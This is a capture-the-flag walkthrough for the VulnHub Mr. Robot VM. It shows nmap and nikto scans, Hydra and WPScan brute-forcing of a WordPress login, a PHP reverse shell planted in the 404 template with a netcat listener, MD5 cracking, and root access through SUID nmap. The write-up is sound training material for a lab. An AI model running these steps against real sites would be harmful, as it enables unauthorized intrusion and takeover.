# Mr. Robot CTF Walkthrough

## Overview

This repository contains a comprehensive walkthrough of the **Mr. Robot** CTF challenge on VulnHub. Inspired by the _Mr. Robot_ TV series, this challenge involves exploiting a vulnerable web application, gaining server access, escalating privileges, and capturing hidden flags. Rated as **Easy-Medium**, this CTF provides an engaging learning experience for cybersecurity enthusiasts.

- **Difficulty**: Easy-Medium  
- **Operating System**: Linux  
- **VM Source**: [Vulnhub - Mr. Robot](https://www.vulnhub.com/entry/mr-robot-1,151/)

---

## Table of Contents

1. [Objectives](#objectives)
2. [Network Configuration](#network-configuration)
3. [Technical Requirements](#technical-requirements)
4. [Setup](#setup)
5. [Walkthrough](#walkthrough)
   - [Flag One](#flag-one)
   - [Flag Two](#flag-two)
   - [Flag Three](#flag-three)
6. [Post-Exploit Analysis](#post-exploit-analysis)
7. [Takeaways](#takeaways)

---

## Objectives

The primary objectives of this CTF include:

1. Gaining initial access to the target machine.
2. Performing privilege escalation.
3. Capturing the three hidden flags within the target system.

---

## Network Configuration

- **Attacker Machine**: Kali Linux (VirtualBox/VMware)
- **Target Machine**: Mr. Robot VM (Connected to an isolated network)
- **Internal Network**: SoldierNet (for isolated communication between attacker and target)

**IP Configuration**:
- Attacker IP: `192.168.56.11`
- Target IP: `192.168.56.10`
- IP Range: `192.168.56.0/24`

---

## Technical Requirements

The following tools were used throughout the walkthrough:

- **BurpSuite**: For intercepting HTTP requests
- **Nmap**: For scanning open ports and services
- **Nikto**: For web vulnerability scanning
- **WPScan**: For WordPress brute-forcing
- **John the Ripper**: For hash cracking
- **Hydra**: For brute-forcing login credentials
- **Netcat**: For establishing reverse shells
- **Linux Enumeration Scripts**: For privilege escalation analysis

---

## Setup

1. Download and set up the Mr. Robot VM from [Vulnhub](https://www.vulnhub.com/entry/mr-robot-1,151/).
2. Add the VM to your preferred hypervisor (VirtualBox/VMware) and connect it to an isolated network for secure testing.
3. Power on the VM and start your attacker machine to begin reconnaissance.

---

## Walkthrough

### Flag One

1. **Initial Nmap Scan**  
    Identify open ports and services on the target machine:
    ```bash nmap -sS -sV -Pn 192.168.56.10``
    ![Nmap Scan](path-to-file)

2. **Nikto Web Vulnerability Scan**
    Scan for potential vulnerabilities:
    ```bash nikto -h http://192.168.56.10 ```
    ![Nikto Scan](path-to-file)

3. **Access robots.txt and Download Files**
    use 'wget' to retrieve files foind in 'robots.txt':
    ```bash wget http://192.168.56.10/robots.txt```

4. **Capture Flag One**
    Display contents of retrieved files to find first flag.
    ![FlagOne](path-to-file)
### Flag Two

1. **Nikto WordPress Vulnerability Scan**
    Perform a Nikto scan to identify WordPress vulnerabilities:
    ```bash nikto -h http://192.168.56.10```
    ![NiktoWPscan](path-to-file)

2. **Connect to WordPress Login Page**
    Navigate to the WordPress login page in your browser:
    ```bash http://192.168.56.10/wp-admin```
    ![WordPress Login](path-to-file)

3. **Capture HTTP Request with BurpSuite**
    Use BurpSuite to intercept and analyze the HTTP request:
    ```bash sudo burpsuite```
    ![BurpSuiteResults](path-to-file)

4. **Enumerate Username with Hydra**
    Use Hydra to enumerate possible usernames:
    ```bash hydra -L usernames.txt -P passwords.txt 192.168.56.10 http-post-form "/wp-login.php"```
    ![HydraResults](path-to-file)

5. **Brute-Force WordPress Site with WPScan**
    Use WPScan to brute-force login credentials:
    ```bash wpscan --url http://192.168.56.10 --enumerate u```
    ![WPscanResults](path-to-file)

6. **Login to WordPress and Obtain Reverse Shell Payload**
    After logging into WordPress, download a reverse shell payload from PentestMonkey and set your attacker IP and desired port.
    [pentestmonkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

7. **Inject Reverse Shell in 404 Template**
    Go to Appearance -> Editor -> 404 Template in WordPress and replace the content with your reverse shell payload.
    ![WordPressTemplate404](path-to-file)

8. **Initiate Listener**
    Set up a Netcat listener on the attacker machine:
    ```bash nc -lvnp 443```
    Then, visit the 404 page to trigger the reverse shell:
    ```bash http://192.168.56.10/wp-content/themes/twentyfifteen/404.php```

9. **Upgrade Shell with Python**
    Once the shell is established, upgrade it for a better TTY experience:
    ```bash python -c 'import pty; pty.spawn("/bin/bash")'```
    ![PythonShell](path-to-file)

10. **Locate 'robot' User Directory**
    Navigate to the '/home/robot' directory to find files related to the second flag.
    ![RobotFolder](path-to-file)

11. **Crack MD5 Password File with JohntheRipper**
    Use John the Ripper to crack the MD5 hash in the 'password.raw-md5' file:
    ```bash john --format=raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt password.raw-md5```
    ![JohntheRipperResults](path-to-file)

12. **Switch user to 'robot'**
    Switch to the robot user with the cracked password and capture Flag Two.
    ![FlagTwo](path-to-file)

### Flag Three

1. **Privelege Escalation**
    Search for files with SUID permissions, which can be exploited for privilege escalation:
    ```bash find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null```
    ![FindResults](path-to-file)

2. **Exploit Nmap Interactive Mode**
    Use Nmap’s interactive mode to gain root access:
    ```bash sudo nmap --interactive```
    Start a shell from within the interactive Nmap session:
    ```bash !sh```
    ![NmapIntResults](path-to-file)

3. **Capture Flag Three**
    As root, access and read the third flag file located in '/root/key-3-of-3.txt'.
    ![FlagThree](path-to-file)